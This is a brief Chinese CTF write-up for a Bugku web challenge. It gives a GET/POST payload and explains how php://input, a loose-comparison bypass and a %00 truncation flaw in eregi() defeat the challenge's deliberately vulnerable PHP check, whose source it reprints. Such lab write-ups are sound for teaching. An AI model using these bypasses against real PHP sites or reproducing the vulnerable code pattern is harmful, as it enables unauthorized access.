# web21 - php://input流, ereg()%00截断漏洞
  
payload:  
`GET：?id=0a&a=php://input&b=%0011111`
`POST：bugku is a nice plateform!`

解释：  
1. id=0a绕过弱类型比较。 

2. ereg()存在%00截断，因此“111%0011111（即111）”可以匹配到“1114”。  


题目源码：  
```php
<?php
if(!$_GET['id'])
{
    header('Location: hello.php?id=1');
    exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
    echo 'no no no no no no no';
    return;
}
$data = @file_get_contents($a,'r');
if ($data == "bugku is a nice plateform!" and $id == 0 and strlen($b) > 5 and eregi("111" . substr($b, 0, 1), "1114") and substr($b, 0, 1) != 4)
{
    $flag = "flag{***********}"
}
else
{
    print "never never never give up !!!";
}


?> 
```

ps. hackbar不好用，用max hackbar!